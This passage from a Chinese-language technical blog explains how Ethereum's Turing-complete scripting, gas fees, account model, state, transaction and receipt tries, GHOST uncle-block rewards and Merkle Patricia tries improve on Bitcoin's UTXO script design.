<li><strong>缺少图灵完备性</strong> – 这就是说，尽管比特币脚本语言可以支持多种计算，但是它不能支持所有的计算。最主要的缺失是循环语句。不支持循环语句的目的是避免交易确认时出现无限循环。理论上，对于脚本程序员来说，这是可以克服的障碍，因为任何循环都可以用多次重复if 语句的方式来模拟，但是这样做会导致脚本空间利用上的低效率，例如，实施一个替代的椭圆曲线签名算法可能将需要256次重复的乘法，而每次都需要单独编码。</li>
<li><strong>价值盲（Value-blindness）</strong>。UTXO脚本不能为账户的取款额度提供精细的的控制。例如，预言机合约（oracle contract）的一个强大应用是对冲合约，A和B各自向对冲合约中发送价值1000美元的比特币，30天以后，脚本向A发送价值1000美元的比特币，向B发送剩余的比特币。虽然实现对冲合约需要一个预言机（oracle）决定一比特币值多少美元，但是与现在完全中心化的解决方案相比，这一机制已经在减少信任和基础设施方面有了巨大的进步。然而，因为UTXO是不可分割的，为实现此合约，唯一的方法是非常低效地采用许多有不同面值的UTXO（例如对应于最大为30的每个k，有一个2^k的UTXO)并使预言机挑出正确的UTXO发送给A和B。</li>
<li><strong>缺少状态</strong> – UTXO只能是已花费或者未花费状态，这就没有给需要任何其它内部状态的多阶段合约或者脚本留出生存空间。这使得实现多阶段期权合约、去中心化的交换要约或者两阶段加密承诺协议（对确保计算奖励非常必要）非常困难。这也意味着UTXO只能用于建立简单的、一次性的合约，而不是例如去中心化组织这样的有着更加复杂的状态的合约，使得元协议难以实现。二元状态与价值盲结合在一起意味着另一个重要的应用-取款限额-是不可能实现的。</li>
<li><strong>区块链盲（Blockchain-blindness）</strong>- UTXO看不到区块链的数据，例如随机数和上一个区块的哈希。这一缺陷剥夺了脚本语言所拥有的基于随机性的潜在价值，严重地限制了博彩等其它领域应用。</li>
</ul>
<p>在白皮书中，引入以太坊的时候，这样介绍：</p>
<p>“以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。……并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。”</p>
<p>既然以太坊社区选择让以太坊拥有如此强大的功能，那么相对应的，他们也必须为此做好准备。我们一条条看一下，为了实现对比特币的改进，以太坊必须添加什么功能。</p>
<p>对比一下以太坊白皮书中列出的比特币和以太坊的状态转换图：</p>
<p>比特币作为状态转移系统</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233062.jpg" alt="img"></p>
<p>以太坊的状态转换：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233063.jpg" alt="img"></p>
<p>在上图中，起始状态保护了四个账户，分别是14c5f8ba、bb75a980、892bf92f、4096ad65。其中14c5f8ba和4096ad65仅维护了余额；bb75a980和892bf92f除了余额之外，还包括一部分的代码和数据。交易数据由14c5f8ba发送到bb75a980，转账10个以太币。同时发送了两个数据2和“charlie”。这个数据传递到账户bb75a980时，触发了bb75a980账户中的代码，意思是如果在对应于交易中携带的数据中的第一个（作为索引），也即tx.data[0]，相对应的位置处的数据是0，则对该位置出的数据进行更新，更新为第二个数据，也即‘charlie’。</p>
<p>所以，这里我们首先需要理解一下以太坊账户的概念。</p>
<p>以太坊的全局“共享状态”是有很多对象（账户）来组成的，这些账户可以通过消息传递架构来与对方进行交互。每个账户都有一个与之关联的状态(state)和一个20字节的地址(address)。在以太坊中一个地址是160位的标识符，用来识别账户的。</p>
<p>有两种类型的账户：</p>
<ol>
<li>外部拥有的账户，被私钥控制且没有任何代码与之关联</li>
<li>合约账户，被它们的合约代码控制且有代码与之关联</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233064.jpg" alt="img"></p>
<h2 id="外部拥有账户（EOA）与合约账户的比较"><a href="#外部拥有账户（EOA）与合约账户的比较" class="headerlink" title="外部拥有账户（EOA）与合约账户的比较"></a>外部拥有账户（EOA）与合约账户的比较</h2><p>理解外部拥有账户和合约账户的基本区别是很重要的。一个外部拥有的账户可以通过创建和用自己的私钥来对交易进行签名，来发送消息给另一个外部拥有账户或合约账户。在两个外部拥有账户之间传送的消息只是一个简单的价值转移。但是从外部拥有的账户到合约账户的消息会激活合约账户的代码，允许它执行各种动作。（比如转移代币，写入内部存储，挖出一个新代币，执行一些运算，创建一个新的合约等等）。</p>
<p>不像外部拥有账户，合约账户不可以自己发起一个交易。相反，合约账户只有在接收到一个交易之后(从一个外部拥有账户或另一个合约账户接)，为了响应此交易而触发一个交易。我们将会在“交易和消息”部分来了解关于合约与合约之间的通信。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233065.jpg" alt="img"></p>
<p>因此，在以太坊上任何的动作，总是被外部控制账户触发的交易所发动的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233066.jpg" alt="img"></p>
<h3 id="账户状态"><a href="#账户状态" class="headerlink" title="账户状态"></a>账户状态</h3><p>账户状态有四个组成部分，不论账户类型是什么，都存在这四个组成部分：</p>
<ol>
<li>nonce：如果账户是一个外部拥有账户，nonce代表从此账户地址发送的交易序号。如果账户是一个合约账户，nonce代表此账户创建的合约序号</li>
<li>balance： 此地址拥有Wei的数量。1 Ether&#x3D;10^18 Wei</li>
<li>storageRoot： Merkle Patricia树的根节点Hash值。Merkle树会将此账户存储内容的Hash值进行编码，默认是空值</li>
<li>codeHash：此账户EVM（以太坊虚拟机，后面细说）代码的hash值。对于合约账户，就是被Hash的代码并作为codeHash保存。对于外部拥有账户，codeHash域是一个空字符串的Hash值</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233067.jpg" alt="img"></p>
<p>可以简单理解EOA就是实际的用户；而合约账户就是EOA用户部署的合约，外部所有的账户（EOA externally owned account）（由私钥控制的）和合约账户（由合约代码控制）。外部所有的账户没有代码，人们可以通过创建和签名一笔交易从一个外部账户发送消息。每当合约账户收到一条消息，合约内部的代码就会被激活，允许它对内部存储进行读取和写入，和发送其它消息或者创建合约。</p>
<p>##图灵完备性</p>
<p>之前在介绍比特币脚本的时候，我们提到过比特币的脚本是故意设计成不完备的，为什么呢？因为之前分析过，在交易中写的脚本，是需要有矿工来执行并进行确认的。如果是图灵完备的，那么有可能会出现死循环的代码，对于矿工而言是非常不利的。</p>
<p>既然以太坊明确地在挑刺儿，也就意味着在以太坊中实现的脚本语言是图灵完备的。既然这样，以太坊必须要解决的问题是，如何应对死循环可能会无限地消耗？</p>
<p>以太坊中引入了gas（瓦斯、油价等中文翻译）的概念。以太坊在区块链上实现了一个运行环境，被称为以太坊虚拟机（EVM），参与到网络的节点都会运行EVM，验证区块中的每个交易并在EVM中运行交易所触发的代码。合约可以利用的每个命令都会有一个相应的费用值，费用使用gas作为单位计数，也即用户付给矿工的佣金。<a href="https://link.zhihu.com/?target=https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit%23gid=0">这里列了一些命令的gas消耗。</a>例：<code>PUSH操作</code>需要消耗<code>3个gas</code>，<code>一次转账</code>一般要消耗<code>21000 gas</code>，gas使用<code>ether</code>（以太币）来支付。</p>
<p>Gas常用的单位是wei，wei和ether的关系如下所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233068.jpg" alt="img"></p>
<p>每笔交易都被要求包括gas limit（startGas，限制）和Gas Price（价格）。Gas Limit 是用户愿意为执行某个操作或确认交易支付的最大Gas量（最少21,000）。Gas Price 是 Gwei 的数量，用户愿意花费于每个 Gas 单位的价钱。发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工打包该交易获得的报酬会更高，这样这个交易会较快地被打包到区块中，更早地获得确认。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233069.jpg" alt="img"></p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233070.jpg" alt="img"></p>
<p>如果交易里gas没有被消耗完毕，剩下的gas都会以以太币（ether）的形式打回给交易发起者。因为gas消耗一般只是一个大致估算，所以许多用户会超额支付gas来保证他们的交易会被接受。这样如果恶意用户在交易中包括了死循环，那么不论付出多少gas，最终都会消耗完。另外，也正是因为这样的代价问题，虽然以太坊的脚本语言是图灵完备的，也即当前的所有代码都可以在以太坊区块链上运行，但是作为开发者，需要认真考虑代码的效率。两个同样功能的合同，效率高的那个才能生存下来。一个帮助人们理解以太坊合同实际能力的启发问题是：这个功能是否能在一个1999年的智能手机上实现？</p>
<p>总结，当进行每笔交易时，用户设定Gas Limit 和Gas Price，在运行时，矿工首先计算 Gas Limit*Gas Price ，就得到了ETH交易佣金的成本，然后这笔费用首先从用户的账户中扣除，交易运行完毕，如果有剩余，再还给用户。如果不够，矿工也不还钱，只是把交易全部回滚。</p>
<p>发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工的报酬会更高。 但是，通过设置较低燃料价格（GasPrice），发送者可以节省资金。以太坊客户端的Frontier版本有一个默认的gasPrice，即0.05e12 wei。矿工为了最大化他们的收益，如果大量的交易都是使用默认gasPrice即0.05e12 wei，那么基本上就很难要矿工去接受一个低gasPrice交易，更别说0 gasPrice交易了。</p>
<p>除了计算交易的花费之外，将交易或者合约上传也需要费用。虽然读取本地区块链是免费的，但写入和运算是花钱的。储存更是尤其昂贵，因为任何写入的信息都会被永久的储存着。相比之下，CPU运算很便宜。以太坊是图灵完备的，谁也拦不住你写一个视频解码器然后发布在区块链上；只不过估计你没钱运行它。假设这样的程序的代码至少有几千行，即使把它上传到区块链上也不会便宜。譬如，gas limit&#x3D;2000，假设交易长为170字节，每字节的费用是5，减去850，所以还剩1150，剩下的才是运行交易能使用的gas上限。</p>
<p>除此之外，每个块还有Block gas limit，这个值在创世区块的配置文件中可以指定，譬如查看一个区块的信息如下，也即区块的gas limit是3573388。block gas limit的用意是限制一个区块中能够包含的交易的数量。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233071.jpg" alt="img"></p>
<p><strong>（二）Value-blindness</strong></p>
<p>同样的，来回忆一下，比特币为什么放弃了基于账户的概念，而采取UTXO机制的呢？</p>
<p>使用UTXO可以避免维护账户余额的麻烦。为什么维护余额很麻烦呢？因为为了使用余额，也即能够让矿工检查和验证余额，余额必须是全局可见的数据。而基本上每个交易都会对余额产生影响和带来变化。也即，余额必须要全局可见，能快速地更新，而且可以验证。</p>
<p><strong>【UTXO的优点： 1.较高程度的隐私保护。</strong>如果用户每次交易都使用一个新的地址，那么账户之间的相互关联就很困难。这样做适用于对安全性要求高的货币系统。<strong>2.潜在地可扩展性。</strong> UTXO在理论上可扩展性更好。对于维护交易的Merkle树，即使所有的人(包括数据的拥有者)都遗忘了某一数据，真正受损也只有数据的拥有者，其他人不受影响。 但在以太坊账户系统中，任何人弄丢了一个账户对应在默克尔树中信息，那么将无法处理任何能够影响账户的消息。相当于UTXO是一次性的；而账户是可重用的。】</p>
<p>既然以太坊期望可以有明确的价值，必须能够实现余额的概念。余额相对于UTXO也有一些优点：</p>
<p><strong>【1.节省空间。</strong>如果一个账户有5个UTXO，则从UTXO模式转成账户模式所需空间会从300字节降到30字节。具体计算如下： 300 &#x3D; (20+32+8）* 5 （20是地址字节数，32是TX的id字节数，8是交易金额值字节数）; 30 &#x3D; 20 + 8 + 2 ( 20是地址字节数，8是交易金额值字节数，2是nonce②字节数) 但实际节约并没有这么大，因为账户需要被存储在帕特里夏树中。另外以太坊中交易也比比特币中的更小（以太坊中100字节，比特币中200-250字节），因为每次交易只需要生成一次引用，一次签名，以及一个输出。<strong>2.可替代性更高。</strong> 在UTXO结构中，“有效输出”的源码实现中没有区块链层的概念，所以不管是在技术还是法律上，通过建立一个红名单&#x2F;黑名单，并依据的这些“有效输出”的来源区分它们并不是很实际。<strong>3.简单。</strong> 以太坊编码更简单、更易于理解，尤其是在涉及到复杂脚本时。尽管任何去中心化应用都可以用UTXO方式来实现，但这种方式实质上是通过赋予一个脚本限制给定的UTXO能够使用以及请求的UTXO的种类的方式来实现，包括脚本评估的应用更改根状态的默克尔树证明。因此，UTXO实现方式比以太坊使用账户的方式要复杂的多。<strong>4.轻客户端</strong> 轻客户端可以随时通过沿指定方向扫描状态树来访问与账户相关的所有数据。在UTXO方式中，引用随着每个交易的变化而变化，这对于长时间运行并使用了UTXO根状态传播机制的dapp应用来说，无疑是繁重的。】</p>
<p>账户方式的一个弱点是：为了阻止重播攻击，每笔交易必须有nonce，nonce的值是上一次使用的nonce值+1，这就使得账户需要跟踪nonce的使用情况，并且必须确认交易的Nonce值比上次使用的Nonce值大1。解决这个问题的一个简单方法是让交易包含一个区块号，这样过一段时间之后，交易便不能重放了。</p>
<p>为了实现账户方式，以太坊的做法是采用状态(state)的概念存储一系列账户，每个账户都有自己的余额，以及以太坊特有的数据（代码或内部存储器）。</p>
<p>以太坊的状态由每个交易改变，</p>
<p>为了维护这个状态，和比特币不同，比特币在区块中只包括了交易的merkle树根，而以太坊在区块头部中会包括三棵树，分别是世界状态树（world state trie），交易树（transaction trie）以及receipt树。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233072.jpg" alt="img"></p>
<p>世界状态</p>
<p>世界状态是地址（账户）到账户状态的映射。虽然世界状态不保存在区块链上，但在黄皮书的描述中，世界状态也由树来保存数据（此树也被称为状态数据库或者状态树）。世界状态可以被视作为随着交易的执行而持续更新的全局状态，也是以太坊中唯一的全局的数据。</p>
<p>以太坊中所有的账户信息都体现在世界状态之中，并由世界状态树保存，状态树持续更新。对于以太坊网络中的每一个账户，状态树中存放了一个键值对，其中键key是160位的账户的地址，值value是账户的相关信息，如上面图中所展示的，包括</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- nonce</span><br><span class="line">- balance</span><br><span class="line">- storageRoot</span><br><span class="line">- codeHash</span><br></pre></td></tr></table></figure>

<p>如果想知道某一账户的余额，或者某智能合约当前的状态，就需要通过查询世界状态树来获取该账户的具体状态信息。其中账户存储树是保存与账户相关联数据的结构。该项只有合约账户才有，而在 EOA 中， storageRoot 留空、 codeHash 则是一串空字符串的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233073.jpg" alt="img"></p>
<p>为什么以太坊中需要保存用户状态的历史记录，而比特币中不需要呢？因为，比特币中区块生成速度较慢，产生分叉的可能性也较低。而且，即使产生了分叉，由于比特币系统中的交易比较简单，只是简单的转账交易，因此回滚起来比较方便。比较容易实现将被抛弃的分叉中的交易进行回滚。而以太坊就不一样了。以太坊的区块生成速度比较快，十几秒就会产生一个区块，因此产生分叉非常频繁，需要经常进行回滚操作。最重要的一点是，以太坊中有智能合约，使得以太坊是图灵完备的，可以实现很复杂的交易。因此，如果不保存历史记录，就很难进行回滚操作。</p>
<p>交易树</p>
<p>每当发布一个区块时，区块中包含的所有交易，会被组织成一棵交易树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。<br>交易树用来证明某笔交易在某个区块当中。交易树中包括的交易的细节：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nonce,</span><br><span class="line">gas price,</span><br><span class="line">gas limit,</span><br><span class="line">recipient,</span><br><span class="line">transfer value,</span><br><span class="line">transaction signature values, and</span><br><span class="line">account initialization (if transaction is of contract creation type), or transaction data (if transaction is a message call)</span><br></pre></td></tr></table></figure>

<p>收据树</p>
<p>每个交易执行完之后，会形成一个收据，记录交易的相关信息，而这些收据会被组织成一棵收据树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。收据树中对应的交易的信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post-transaction state,</span><br><span class="line">the cumulative gas used,</span><br><span class="line">the set of logs created through execution of the transaction, and</span><br><span class="line">the Bloom filter composed from information in those logs</span><br></pre></td></tr></table></figure>


<p>那么，既然已经有了交易树，为什么还需要收据树这个数据结构呢？<br>因为，以太坊拥有智能合约，而智能合约的执行过程比较复杂，通过增加收据树，有利于系统快速查询执行的结果。<br>在以太坊中，每个交易对应的收据中都会包含一个Bloom filter，记录这个交易的类型、地址等信息。发布的区块的块头中也有一个总的Bloom filter，这个Bloom filter是所有收据中的Bloom filter的并集。<br>如果我们需要查找过去一段时间内发生的和某个智能合约相关的所有交易，首先需要在区块的块头中的Bloom filter中看看有没有我们要查找的交易的类型，如果有的话，再到区块中的每个交易对应的收据的Bloom filter中进行查找；而如果没有的话，那么该区块中一定没有我们要查找的交易类型。通过该种方法，就可以快速排除掉无关的收据，从而提高查找速度。</p>
<p>（三）状态</p>
<p>（四）区块链盲</p>
<p>在脚本图灵完备以及维护了状态树的情况下，以上两个特征实现起来就容易了。</p>
<p>GHOST协议</p>
<p>GHOST（Greedy Heaviest Observed Subtree）是一种主链（非侧链）选择协议。举例来说：经典的Proof-of-Work（POW）是以取最长的主链为基本原则，GHOST协议则是以包含块数最多为基本原则。</p>
<p>在比特币协议中，最长的链被认为是绝对的正确。如果一个块不是最长链的一部分，那么它被称为是“孤块”。一个孤立的块也是合法的，但是发现的稍晚，或者是网络传输稍慢，而没有能成为最长的链的一部分。在比特币中，孤块没有意义，随后将被抛弃，发现这个孤块的矿工也拿不到采矿相关的奖励。例如：挖矿节点A是一个矿池占有全网30%的算力，挖矿节点B占有全网算力的10%，节点A会有70%的概率产生废块，节点B有90%的概率产生废块。</p>
<p>以太坊平均10多秒发布一个区块，<strong>更短的出块时间意味着，临时性分叉的几率将大幅提升</strong>。这是因为当矿工A挖出一个新区块后，需要向全网广播，广播的过程需要时间，由于以太坊出块时间短，其他节点可能还没有收到矿工A发布的区块，就已经挖出了同一高度的区块，这就造成了临时分叉。<strong>在以太坊网络中，临时性分叉发生的几率在8%左右。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233074.png" alt="img"></p>
<p>同时，如果新旧区块之间产生的间隔太短, 在上面的例子中，则节点A会因为规模效应而比B节点更为高效。所以新旧区块的间隔过短会导致单一的矿池主导全网的挖矿过程。而区块中的数据重复验证6次（若干次）立即永久封存地区块中，一旦51%算力攻击一旦发生，double-spend等糟糕问题会出现，恶意的数据容易永久封存于区块中，整个blockchain系统需要足够长的时间来处理和恢复黑客恶意攻击所造成的破坏。</p>
<p>在以太坊中，根据GHOST协议，不认为孤块没有价值，而是会给与发现孤块的矿工以回报。孤块被称为“叔块”(uncle block)，它们可以为主链的安全作出贡献，也同样能获得奖励，这激励了矿工在新发现的块中去引用叔块，减少了孤块的产生。</p>
<p>Ghost协议解决了两个问题：摒弃了单一的最长链原则, 取而代之的是最大子数原则；孤块奖励问题。</p>
<p>如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233075.jpg" alt="img"></p>
<p>如果单纯的计算最长链原则, 主链应该是 0 -&gt; 1B -&gt; 2D -&gt; 3F -&gt; 3F -&gt; 4C -&gt; 5B.<br>如果采用了GHOST协议, 以前的”废块”也会被考虑到主链的计算量中.每一个节点下含一个子树, 兄弟节点之间子树节点最多的被选为主链. 这样一来 0 -&gt; 1B -&gt; 2C -&gt; 3D -&gt; 4B 成为主链,<br>如果采用GHOST协议, 一个攻击者仅仅提供一个1A到6A的长链并不能被认为是主链。</p>
<p>Ghost协议的优势在于：</p>
<ul>
<li>以太坊十几秒的出块间隔，大大增加了孤块的产生，并且降低了安全性。通过鼓励引用叔块，使引用主链获得更多的安全保证（因为孤块本身也是合法的）</li>
<li>比特币中，采矿中心化(大量的集中矿池)成为一个问题。Ghost协议下，叔块也是能够获得报酬，可以一定程度上缓解这个问题。</li>
</ul>
<p>孤块奖励问题：</p>
<ul>
<li>主链节点获得base reward；</li>
<li>一个节点最多引用两个叔块；</li>
<li>叔块必须是区块的前2层~前7层的祖先的直接子块；</li>
<li>被引用过的叔块不能重复引用；</li>
<li>引用叔块的区块，可以获得挖矿报酬的1&#x2F;32，也就是5<strong>1&#x2F;32&#x3D;0.15625 Ether，最多获得2</strong>0.15625&#x3D;0.3125 Ether；</li>
<li>主链节点的兄弟（非主链节点）获得 ((叔块高度+8-当前块的高度)&#x2F;8 )*base reward，如下图表格所示；</li>
<li>交易费用(transaction fee)不会分配给叔块</li>
</ul>
<p>我们通过一个例子来介绍上面的规则。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233076.jpg" alt="img"></p>
<p>假设当前区块高度为107（上图中绿色区块），它能有效引用的叔块，只能是区块高度为101～106的区块，换句说<strong>叔块的有效引用区间，最多只能在7代以内。</strong>上图中黄色区块，区块高度为100，就不在107这个区块的有效引用范围。图中红色的区块，因为<strong>不是最长链上区块的直接子块，这种区块不能成为叔区块。</strong></p>
<p>如果在101和106的区块高度，有多个没被引用的叔块，高度为107的区块做多只能引用两个，而且<strong>一个叔块被它引用后，就不能再被其他区块重复引用。</strong></p>
<p>被引用的叔块获得奖励数量，取决与该叔块和引用区块的“远近”关系。<strong>关系越近，叔块得到奖励越多。</strong>而引用叔块的区块，每引用一个区块，都能得到系统出块奖励的1&#x2F;32，最多只能引用两个区块。当前以太坊新区块获得系统奖励为2枚以太币（2ether），如果叔块在间隔一层就被引用，该叔块将获得出块奖励的7&#x2F;8，也就是1.75ether，如果叔块隔了6层才被引用，它获得奖励只有0.5ether，具体如下表。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233077.jpg" alt="img">间隔层数与叔块奖励的关系</p>
<p>看一个真实的块的情况<a href="https://link.zhihu.com/?target=https://etherscan.io/block/4222300">4222300</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233078.jpg" alt="img"></p>
<hr>
<p>由于以上特性，以太坊的轻客户端比Bitcoin的轻客户端功能更强。Bitcoin的轻客户端可以证明包含的交易，但是它不能进行涉及当前状态的证明（如数字资产的持有，名称注册，金融合约的状态等）。而以太坊的轻客户端能够轻松地进行并核实以下类型的查询答案：</p>
<ul>
<li>这笔交易被包含在特定的区块中了么？</li>
<li>告诉我这个地址在过去30天中，发出X类型事件的所有实例（例如，一个众筹合约完成了它的目标）</li>
<li>目前我的账户余额是多少？</li>
<li>这个账户是否存在？</li>
<li>假装在这个合约中运行这笔交易，它的输出会是什么？</li>
</ul>
<p>第一种是由交易树（transaction tree）来处理的；第三和第四种则是由状态树（state tree）负责处理，第二种则由收据树（receipt tree）处理。计算前四个查询任务是相当简单的。服务器简单地找到对象，获取Merkle分支，并通过分支来回复轻客户端。第五种查询任务同样也是由状态树处理，但它的计算方式会比较复杂。</p>
<p>这些树使用了一个非常重要的数据结构。默克尔帕特里夏树(Merkle Patricia tree&#x2F;trie)，由Alan Reiner提出设想，并在瑞波协议中得到实现，是以太坊的主要数据结构，用于存储所有账户状态，以及每个区块中的交易和收据数据。MPT是默克尔树和帕特里夏树的结合缩写，结合这两种树创建的结构具有以下属性：</p>
<ol>
<li>每个唯一键值对唯一映射到根的hash值；在MPT中，不可能仅用一个键值对来欺骗成员（除非攻击者有~2^128 的算力）；</li>
<li>增、删、改键值对的时间复杂度是对数级别。</li>
</ol>
<p>MPT为我们提供了一个高效、易更新、且代表整个状态树的“指纹”。</p>
<p>二叉Merkle树对于验证“清单”格式的信息而言，是非常好的数据结构，本质上来讲，它就是一系列前后相连的数据块。对于交易树来说，它们也同样是不错的，因为一旦树已经建立，花多少时间来编辑这棵树并不重要，树一旦建立了，它就会永远存在。</p>
<p>而对状态树来说，情况会更复杂些。以太坊中的状态树基本上包含了一个键值映射，其中的键是地址还有各种值，包括账户的声明、余额、随机数、代码以及每一个账户的存储（其中存储本身就是一颗树）。例如，the Morden testnet 的创始状态如下所示：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;0000000000000000000000000000000000000001&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000002&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000003&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000004&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;102e61f5d8f9bc71d0ad4a084df4e65e05ce0e1c&quot;: &#123; &quot;balance&quot;: &quot;1606938044258990275541962092341162602522202993782792835301376&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>不同于交易历史记录，状态树需要经常地进行更新：账户余额和账户的随机数nonce经常会更变，更重要的是，新的账户会频繁地插入，存储的键（ key）也会经常被插入以及删除。MPT的数据结构设计，使得我们可以在一次插入、更新编辑或者删除操作之后，快速地计算出新的树根（tree root），而无需重新计算整颗树。此外，它还有两个非常好的特性：</p>
<ol>
<li>树的深度是有限制的。考虑到攻击者会故意地制造一些交易，使得这棵树尽可能地深，从而可以通过操纵树的深度，执行拒绝服务攻击（DOS attack），使得更新变得极其缓慢。</li>
<li>树的根只取决于数据，和其中的更新顺序无关。换个顺序进行更新，甚至重新从头计算树，并不会改变根。</li>
</ol>
<p><strong>帕特里夏树（Patricia Trees）（压缩前缀树）</strong></p>
<p>Merkle Patricia Tree（又称为Merkle Patricia Trie）是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。</p>
<p>MPT结合了（1）radix trie (patricia)（2）Merkle tree两种树结构的特点与优势 ，因为Merkle树之前已经详细介绍过，所以这里直接讨论前缀树以及压缩前缀树（patricia树）。</p>
<p>Trie树，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>
<p>下面这棵trie包含这样一组单词，inn, int, at, age, adv, ant 每个节点存储的是字符串中的部分字符，每个从根到某个节点的路径（不一定到叶子节点）代表了一个存储的字符串，如果想查找adv是否存在，只需要走红圈这样的路径即可。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233079.jpg" alt="img"></p>
<p>Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。它有3个基本性质：</p>
<ol>
<li>根节点不包含字符，除根节点外每一个节点都只包含一个字符。</li>
<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>
<li>每个节点的所有子节点包含的字符都不相同。</li>
</ol>
<p>典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较。举个具体的例子：</p>
<p>题目：给你100000个长度不超过10的单词。对于每一个单词，我们要判断它出没出现过，如果出现了，求第一次出现在第几个位置。<br>分析：这题当然可以用hash来解决，但是比如说对于某一个单词，我们要询问它的前缀是否出现过。这样hash就不太适用，而用trie还是很简单。<br>现在回到例子中，如果我们用最朴实的方法，对于每一个单词，我们都要去查找它前面的单词中是否有它。那么这个算法的复杂度就是O(n^2)。显然对于100000的范围难以接受。现在我们换个思路想。假设我要查询的单词是abcd，那么在前面的单词中，以b，c，d，f之类开头的显然不必考虑。而只要找以a开头的中是否存在abcd就可以了。同样的，在以a开头中的单词中，我们只要考虑以b作为第二个字母的，一次次缩小范围和提高针对性，这样一个树的模型就渐渐清晰了。<br>好比假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233080.jpg" alt="img"></p>
<p>如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是10。</p>
<p>以上只是简化表示，实际上，trie每个节点是一个确定长度的数组，数组中每个节点的值是一个指向子节点的指针，最后有个标志域，标识这个位置为止是否是一个完整的字符串。从这个意义上讲，trie树每一层的节点数是26^i级别的，但实际上并没有这么多，很多位置的相应指针为空。</p>
<p>常见的用来存英文单词的trie每个节点是一个长度为27的指针数组，index0-25代表a-z字符，26为标志域。如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233081.jpg" alt="img"></p>
<p>缺点：</p>
<ul>
<li>直接查找效率较低</li>
</ul>
